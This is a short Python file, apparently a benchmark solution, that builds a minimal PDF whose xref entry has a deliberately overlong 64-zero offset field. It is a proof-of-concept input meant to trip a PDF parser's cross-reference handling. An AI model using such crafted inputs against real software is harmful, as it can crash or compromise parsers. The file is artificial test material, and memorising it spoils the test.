import os

class Solution:
    def solve(self, src_path: str) -> bytes:
        header = b'%PDF-1.3\n'
        xref_pos = len(header)  # position where "xref" starts

        # Overlong f1 (offset) field consisting only of zeros
        f1 = b'0' * 64
        # Keep f2 (generation) normal-sized and valid, with a free ('f') entry
        entry = f1 + b' 65535 f \n'

        body = (
            b'xref\n'
            b'0 1\n' +
            entry +
            b'trailer\n'
            b'<<>>\n'
            b'startxref\n' +
            str(xref_pos).encode('ascii') +
            b'\n%%EOF\n'
        )

        return header + body
